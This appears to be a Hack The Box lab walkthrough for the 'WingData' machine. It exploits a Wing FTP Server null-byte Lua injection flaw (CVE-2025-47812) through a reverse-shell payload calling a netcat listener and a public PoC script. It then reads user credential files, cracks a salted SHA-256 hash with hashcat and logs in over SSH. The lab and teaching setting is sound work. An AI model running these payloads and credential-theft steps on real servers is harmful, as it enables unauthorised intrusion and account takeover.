# HTB WingData — CTF Walkthrough & Theory Notes

**Machine:** WingData | **Difficulty:** Easy | **OS:** Linux **CVE:** CVE-2025-47812 (Null Byte RCE) | **Goal:** Capture `user.txt`

---

## A) Attack Overview

> Full attack chain for the user flag:

```
[Scan] nmap finds port 22 (SSH) and port 80 (HTTP)
   ↓
[Enumerate] Web app on port 80 — vhost ftp.wingdata.htb
            Identify Wing FTP Server v7.4.3 (vulnerable version)
   ↓
[Exploit] CVE-2025-47812 — Null Byte Injection in login field
          → Lua code injected into session file on disk
          → Session file executed by server → Reverse shell (wingftp user)
   ↓
[Pivot] Find password hash in Wing FTP user XML files
        → Crack hash with hashcat
        → SSH as local system user (wacky)
   ↓
[USER FLAG] cat /home/wacky/user.txt
```

### Tools Reference

|Tool|Purpose|
|---|---|
|`nmap`|Port scan — discover open services and versions|
|`curl` / browser|Web enumeration and vhost discovery|
|`nc`|Catch incoming reverse shell connections|
|`ssh`|Stable authenticated shell access|
|`hashcat`|Offline password hash cracking|
|`python3`|Shell stabilization and local HTTP server|
|`CVE-2025-47812.py`|PoC exploit script|

---

## B) Phase 1 — Reconnaissance

### B.1 — Host File Configuration

```bash
echo "10.129.18.96  wingdata.htb ftp.wingdata.htb" >> /etc/hosts
```

Web servers often use virtual hosting — serving different content depending on the `Host:` HTTP header. Without mapping the hostname locally, tools will resolve to the wrong vhost or get a default page that hides the actual application.

---

### B.2 — Nmap Port Scan

**Fast initial scan:**

```bash
nmap -Pn --min-rate 5000 10.129.18.96
```

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

**Detailed service scan on discovered ports:**

```bash
nmap -Pn -A -p 80,22 10.129.18.96
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey:
|   256 a1:fa:95:8b:d7:56:03:85:e4:45:c9:c7:1e:ba:28:3b (ECDSA)
|_  256 9c:ba:21:1a:97:2f:3a:64:73:c1:4c:1d:ce:65:7a:2f (ED25519)
80/tcp open  http    Apache httpd 2.4.66
|_http-server-header: Apache/2.4.66 (Debian)
|_http-title: WingData Solutions
```

**Flag Breakdown:**

|Flag|Meaning|
|---|---|
|`-Pn`|Skip host discovery — treat host as up|
|`--min-rate 5000`|Send packets at minimum 5000/sec (fast scan)|
|`-A`|Aggressive scan: OS detection, version, scripts, traceroute|
|`-p 80,22`|Scan only specified ports|

**Findings:**

|Port|Service|Significance|
|---|---|---|
|22|SSH (OpenSSH 9.2p1)|Login target after credential recovery|
|80|HTTP (Apache 2.4.66)|Primary attack surface — web application|

---

### B.3 — Web Enumeration & Version Fingerprinting

Navigate to `http://wingdata.htb` → observe a WingData Solutions landing page.

The page links to a **Client Portal** → redirects to `http://ftp.wingdata.htb/` → Wing FTP Server login page.

**Critical observation:** The page footer or server response reveals `Wing FTP Server v7.4.3`

Version 7.4.3 maps to **CVE-2025-47812** — a pre-authentication Remote Code Execution vulnerability via Null Byte Injection. No credentials are needed to exploit it.

---

## C) Phase 2 — Exploitation (CVE-2025-47812)

### Theory: Null Byte Injection

Null Byte Injection (`\0` / `%00`) exploits a fundamental difference between how languages handle string termination:

|Language / Runtime|Null Byte (`\0`) Behavior|
|---|---|
|C / C++|Terminates a string — everything after `\0` is invisible|
|Lua|Does not treat `\0` as special — reads full buffer|

Wing FTP Server uses C/C++ for its core networking layer but **Lua** as its scripting engine for session logic. This creates a dangerous language boundary.

---

### Theory: Session Files as Code

When a user authenticates, Wing FTP writes a session file to disk in Lua format. When the user requests a page (e.g., `dir.html`), the server calls `dofile()` on that session file — meaning the file is **executed as code**, not merely read as data.

Any Lua syntax injected into the username field gets written to this file and later executed by the interpreter.

---

### Theory: The Null Byte Bypass Mechanism

```
Input:    anonymous%00"]]..os.execute('nc 10.10.17.95 5555 -e /bin/sh')..[[
                │
                ▼
C Validator:  reads "anonymous" then stops at \0 → PASSES validation
                │
                ▼
File Write:   writes entire raw buffer to disk
                │
                ▼
Lua dofile(): ignores \0, reads full content → executes os.execute(...)
```

---

### C.1 — Start Netcat Listener

```bash
nc -lvnp 5555
```

---

### C.2 — Clone and Run the PoC

```bash
git clone https://github.com/4m3rr0r/CVE-2025-47812-poc
cd CVE-2025-47812-poc
python3 CVE-2025-47812.py -u http://ftp.wingdata.htb -c "nc 10.10.17.95 5555 -e /bin/sh" -v
```

**Output:**

```
[*] Testing target: http://ftp.wingdata.htb
[+] Sending POST request with command: 'nc 10.10.17.95 5555 -e /bin/sh' and username: 'anonymous'
[+] UID extracted: 8bb36760279649c98f3fa0a42c559668f528764d624db129b32c21fbca0cb8d6
[+] Sending GET request to /dir.html with UID: 8bb36760...
[-] Error sending GET request: Read timed out.   ← normal, shell already fired
```

The timeout on the GET request is expected — the shell callback fires before the HTTP response returns.

---

### C.3 — Catch and Stabilize the Shell

**Switch to your nc terminal:**

```
connect to [10.10.17.95] from (UNKNOWN) [10.129.18.96] 37052
whoami
wingftp
```

**Shell Stabilization:**

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Press Ctrl+Z
stty raw -echo; fg
```

---

## D) Phase 3 — Credential Hunting & User Pivot

### D.1 — Find Wing FTP User Files

```bash
cd /opt/wftpserver/Data/1/users
ls
```

```
anonymous.xml  john.xml  maria.xml  steve.xml  wacky.xml
```

### D.2 — Extract the Password Hash

```bash
cat wacky.xml
```

```xml
<UserName>wacky</UserName>
<Password>32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca</Password>
```

---

### D.3 — Crack the Hash

Save the hash on your attack machine and crack it with hashcat. The hash is SHA-256 salted with the username (`WingFTP` as salt — mode 1410):

```bash
echo "32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP" > hash.txt
hashcat -m 1410 hash.txt /usr/share/wordlists/rockyou.txt
```

**Result:**

```
32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP:!#7Blushing^*Bride5
```

Password: `!#7Blushing^*Bride5`

---

### D.4 — SSH In as wacky

```bash
ssh wacky@10.129.18.96
# Password: !#7Blushing^*Bride5
```

---

### D.5 — Capture User Flag

```bash
cat /home/wacky/user.txt
```

---

## E) Key Concepts Reference

|Concept|Technical Explanation|
|---|---|
|Null Byte Injection|`\0` terminates C strings but is transparent to Lua — causes validation bypass across language boundary|
|Session Poisoning|Writing attacker-controlled Lua code into server-side session files which are later executed|
|Lua Code Execution|Wing FTP uses `dofile()` to load session state — any Lua syntax in the file runs at load time|
|Pre-Auth RCE|Vulnerability exploitable without valid credentials — maximum severity|
|Hash Cracking|Offline dictionary attack — hashcat mode 1410 for SHA256+salt|
|SSH Key Auth|Stable access after credential recovery|

---

## F) Quick Command Reference

```bash
# Environment setup
echo "10.129.18.96 wingdata.htb ftp.wingdata.htb" >> /etc/hosts

# Reconnaissance
nmap -Pn --min-rate 5000 10.129.18.96
nmap -Pn -A -p 80,22 10.129.18.96

# Exploit
nc -lvnp 5555
git clone https://github.com/4m3rr0r/CVE-2025-47812-poc
cd CVE-2025-47812-poc
python3 CVE-2025-47812.py -u http://ftp.wingdata.htb -c "nc 10.10.17.95 5555 -e /bin/sh" -v

# Shell stabilization
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
stty raw -echo; fg

# Credential hunting
cat /opt/wftpserver/Data/1/users/wacky.xml

# Hash cracking (attack machine)
echo "HASH:WingFTP" > hash.txt
hashcat -m 1410 hash.txt /usr/share/wordlists/rockyou.txt

# Stable access
ssh wacky@10.129.18.96

# User flag
cat /home/wacky/user.txt
```

---

_HTB WingData | CVE-2025-47812 — Null Byte Injection → Lua RCE → Hash Cracking → User Flag_
